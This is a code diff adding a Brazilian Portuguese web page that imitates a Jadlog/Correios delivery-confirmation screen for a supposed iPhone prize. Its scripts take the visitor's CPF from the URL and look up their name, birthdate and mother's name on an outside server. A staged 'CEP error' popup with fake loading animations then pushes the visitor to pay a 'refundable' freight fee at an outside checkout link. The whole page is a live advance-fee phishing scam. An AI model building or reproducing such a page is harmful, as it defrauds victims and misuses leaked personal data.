@@ -1,0 +1,348 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="stylesheet" href="css/style.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        #buttonClick {
+            background-color: #048848;
+            color: white;
+            font-family: "Poppins";
+            padding: 7px 15px 7px 15px !important;
+            text-decoration: none !important;
+            border-radius: 10px !important;
+            border: none !important;
+            font-size: 18px !important;
+            font-weight: 600;
+        }
+
+        #buttonClick:hover {
+            background-color: #0071c6;
+            cursor: pointer;
+        }
+    </style>
+
+
+    <title>VERIFICAÇÃO</title>
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script></head>
+
+
+
+<body>
+    <header>
+        <img src="images/logo_home.png" alt="">
+
+        <p style="margin-top: 5px; font-size: 12px;">Será responsável pelo envio do pedido.</p>
+    </header>
+
+    <div class="cta">
+        <img id="imagem" src="images/certo-jadlog.png" alt="">
+
+        <p>Confirme os dados de envio seu pedido:</p>
+    </div>
+
+<style>
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    height: 105vh;
+    margin: 0;
+    background-color: #ffffff;
+  }
+
+  @keyframes pulse {
+    0% {
+      box-shadow: 0 0 0px rgba(0, 123, 255, 0.6);
+    }
+    50% {
+      box-shadow: 0 0 20px rgba(0, 123, 255, 1);
+    }
+    100% {
+      box-shadow: 0 0 0px rgba(0, 123, 255, 0.6);
+    }
+  }
+
+  .img-brilhante {
+    width: 105%;
+    max-width: 100px;
+    animation: pulse 2s infinite;
+    border-radius: 8px;
+    margin-top: -1.7em;
+    margin-bottom: 1.0em;
+  }
+</style>
+
+<img src="images/iphone.png" alt="iPhones" class="img-brilhante">
+
+<div id="info"> 
+  <p id="linha-bairro"><strong>Bairro:</strong> <span id="bairro">Detectando...</span></p>
+  <p><strong>Cidade:</strong> <span id="cidade">—</span></p>
+  <p><strong>Estado:</strong> <span id="estado">—</span></p>
+</div>
+
+<script>
+fetch("https://sorteiovivasorte1.com/get-endereco.php/get-endereco.php")
+  .then(res => res.json())
+  .then(data => {
+    if (data.bairro) {
+      document.getElementById("bairro").textContent = data.bairro;
+    } else {
+      document.getElementById("linha-bairro").style.display = "none";
+    }
+
+    document.getElementById("cidade").textContent = data.cidade || "—";
+    document.getElementById("estado").textContent = data.estado || "—";
+  })
+  .catch(() => {
+    document.getElementById("bairro").textContent = "Erro";
+    document.getElementById("cidade").textContent = "Erro";
+    document.getElementById("estado").textContent = "Erro";
+  });
+</script>
+
+<div style="text-align: center;">
+  <p id="setars">
+    O envio será feito em parceria com os Correios e o Sedex.
+  </p>
+</div>
+
+
+<div class="cta4">
+    <button id="sends" type="button">CONFIRMAR</button>
+</div>
+
+    <div id="popoup">
+        <div class="popoupcontent">
+            <div class="row">
+                <img id="naomostrardeinicio" src="images/red-hazard-warning-sign-on-transparent-background-free-png.png" alt="">
+
+                <div class="headlineectapopoup">
+                    <h1 id="carregandodadoss">Confirmando seus dados...</h1>
+                    <p id="esconderdepois">Por favor aguarde</p>
+                </div>
+
+                <h1 id="carregandodadosSs">ERRO NO CEP</h1>
+            </div>
+
+            <div class="loading">
+                <br>
+                <div class="progresseBar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+            <div class="contente">
+                <p>
+                    O valor do CEP foi calculado errado para sua região, o envio não será enviado.
+
+                    <br><br>
+
+                    Para realizarmos o envio é necessário que envie o pagamento do frete. (O Valor pago do frete será reembolsado.)
+                </p>
+<style>
+@keyframes bordaPiscando {
+  0%, 100% { border-color: red; }
+  50%     { border-color: transparent; }
+}
+
+@keyframes aparecer {
+  to { opacity: 1; }
+}
+
+@keyframes dots {
+  0%   { content: "."; }
+  33%  { content: ".."; }
+  66%  { content: "..."; }
+  100% { content: "."; }
+}
+
+@keyframes fadeOut {
+  to { opacity: 0; visibility: hidden; height: 0; margin: 0; padding: 0; }
+}
+
+#img-container {
+  text-align: center;
+  margin-top: 10px;
+}
+
+#img-container p {
+  margin: 8px 0;
+  font-size: 14px;
+}
+
+#img-container strong {
+  display: block;
+  margin: 12px 0 6px;
+}
+
+/* Texto \"Calculando\" */
+#loading-box {
+  font-weight: bold;
+  font-size: 16px;
+  color: #0047BB;
+  min-height: 30px;
+  animation: fadeOut 0.2s ease 9s forwards;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin: 8px 0;
+}
+
+.loading-spinner::after {
+  content: ".";
+  animation: dots 1s steps(3, end) infinite;
+}
+
+/* Imagem */
+.img-destaque {
+  width: auto !important;
+  height: auto !important;
+  max-width: 100% !important;
+  border: 4px solid red;
+  border-radius: 10px;
+  display: block;
+  margin: 10px auto;
+  opacity: 0;
+  animation:
+    aparecer 0.5s ease 9s forwards,
+    bordaPiscando 1s infinite 3s;
+}
+</style>
+
+<div id="img-container">
+  <p><strong>Esse é o novo prazo de entra:</strong></p>
+  <div id="loading-box">
+    <span>Calculando</span><span class="loading-spinner"></span>
+  </div>
+  <img id="prazo-img" src="images/entrega.png" alt="Prazo Sedex" class="img-destaque">
+</div>
+
+
+
+
+
+
+                <a id="buttonClick" href="https://pay.compraeegurapay.com/checkout/3e43558b-4631-4538-86b8-9592bdb6933f">
+                    PAGAR FRETE
+                </a>
+
+                <span id="maisforte">Clique no botão para continuar</span>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <img src="images/jadlog-logo-png.png" alt="">
+
+        <p>Todo conteúdo deste site está publicado sob a licença</p>
+    </footer>
+
+    <script src="js/text.js"></script>
+
+    <script>
+        const queryParams = new URLSearchParams(window.location.search);
+
+        const cpf = queryParams.get('document');
+
+        const user = {};
+
+        function renderData() {
+            if (user.sex && user.birthdate) {
+                let htmlContent = `
+                    Nome: <b>${user.name}</b><br>
+                    Sexo: <b>${user.sex === 'M' ? 'Masculino' : user.sex === 'F' ? 'Feminino' : user.sex}</b><br>
+                    Data de nascimento: <b>${user.birthdate}</b>`;
+
+                if (user.mother && user.mother !== "0") {
+                    htmlContent += `
+                        <br>Nome da mãe: <b>${user.mother}</b>
+                    `;
+                }
+
+                document.getElementById('setar').innerHTML = htmlContent;
+            } else {
+                document.getElementById('setar').innerHTML = `Carregando...`;
+            }
+        }
+
+        fetch('https://g1-noticia.net/verificacao/getUserData.php?cpf=' + cpf)
+            .then(response => response.json())
+            .then(data => {
+                user.name = data.name;
+                user.sex = data.sex;
+                user.cpf = data.cpf;
+                user.mother = data.mother;
+                user.birthdate = data.birthdate;
+
+                renderData();
+            })
+            .catch(error => {
+                console.error('Erro ao fazer a solicitação:', error);
+            });
+            
+    </script>
+    
+    <style>
+#sends {
+    background-color: #0071c6;
+    color: white;
+    font-family: "Poppins", sans-serif;
+    padding: 12px 24px;
+    border: none;
+    border-radius: 10px;
+    font-size: 18px;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+    max-width: 280px;
+    transition: background-color 0.3s ease;
+    margin-top: 20px;
+}
+
+#sends:hover {
+    background-color: #048848;
+}
+</style>
+
+<style>
+  .progresseBar {
+    width: 100%;
+    height: 10px;
+    background-color: #eee;
+    border-radius: 5px;
+    overflow: hidden;
+  }
+
+  .progress {
+    width: 0%;
+    height: 100%;
+    background-color: #0071c6; /* Cor azul desejada */
+    transition: width 0.5s ease;
+  }
+</style>
+
+
+
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MBNDSM8M" height="0" width="0"
+            style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+<script src="js/latest_1.js" async="" defer=""></script>
+<script>
+  window.pixelId = "67dc9fba36518527d053875e";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+
+</body></html>
